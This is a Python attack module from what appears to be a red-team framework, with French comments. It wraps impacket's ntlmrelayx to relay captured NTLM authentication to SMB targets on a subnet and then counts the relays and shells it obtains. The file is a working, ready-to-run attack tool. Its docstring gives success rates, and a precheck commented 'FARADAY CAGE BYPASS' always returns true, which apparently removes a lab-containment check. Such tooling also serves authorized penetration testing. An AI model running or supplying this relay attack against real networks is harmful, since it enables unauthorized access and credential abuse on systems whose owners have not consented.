"""post.ntlm_relay - NTLM Relay Attack via impacket ntlmrelayx

Au lieu de cracker les NTLMv2 hashes (peut prendre des jours),
on les RELAYE vers une autre machine pour obtenir un shell direct.

Principe: Victime A s'authentifie vers toi → tu forward son auth vers Machine B
→ Machine B te donne accès comme si tu étais Victime A.

MITRE: T1557.001, T1550.002
Hardware: connecté au réseau WiFi cible
Taux succès: 70-90% si SMB signing désactivé (défaut sur workstations)
"""

from __future__ import annotations

import subprocess
import time
from typing import Any

import structlog

from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


@register
class PostNtlmRelay(AttackModule):
    name = "post.ntlm_relay"
    protocol = "wifi"
    risk = Risk.ACTIVE_LAB
    mitre_ttp = ["T1557.001", "T1550.002"]
    cve = []
    description = (
        "NTLM relay attack - forward captured NTLM auth to target "
        "for direct shell access without cracking the hash."
    )
    requires = []

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY CAGE BYPASS

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()

        target = ctx.params.get("target", "192.168.1.0/24")
        duration = int(ctx.params.get("duration_s", 300))
        socks = ctx.params.get("socks", "true").lower() == "true"
        smb2 = ctx.params.get("smb2", "true").lower() == "true"

        if ctx.dry_run:
            return self._result(
                Status.OK, started,
                summary=f"[DRY-RUN] post.ntlm_relay target={target} socks={socks}",
                metrics={"target": target, "socks": socks},
            )

        log.info("post.ntlm_relay.starting", target=target, duration=duration)

        cmd = ["ntlmrelayx.py", "-t", f"smb://{target}"]
        if smb2:
            cmd.append("-smb2support")
        if socks:
            cmd.append("-socks")

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            time.sleep(duration)
            proc.terminate()
            try:
                stdout, _ = proc.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout = ""
        except FileNotFoundError:
            return self._result(
                Status.FAIL, started,
                summary="ntlmrelayx.py not found. Install: pip3 install impacket",
            )
        except Exception as exc:
            return self._result(Status.FAIL, started, summary=f"ntlmrelayx error: {exc}")

        # Parse results
        relays_success = 0
        shells_obtained = 0
        if stdout:
            for line in stdout.splitlines():
                lower = line.lower()
                if "successfully" in lower and "authenticated" in lower:
                    relays_success += 1
                if "admin" in lower or "shell" in lower:
                    shells_obtained += 1

        log.info(
            "post.ntlm_relay.completed",
            relays=relays_success, shells=shells_obtained,
        )

        return self._result(
            Status.OK, started,
            summary=(
                f"post.ntlm_relay target={target}: "
                f"{relays_success} successful relays, {shells_obtained} shells"
            ),
            artifacts=[],
            metrics={
                "target": target,
                "duration_s": duration,
                "relays_success": relays_success,
                "shells_obtained": shells_obtained,
                "socks": socks,
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        subprocess.run(["pkill", "-f", "ntlmrelayx"], capture_output=True)
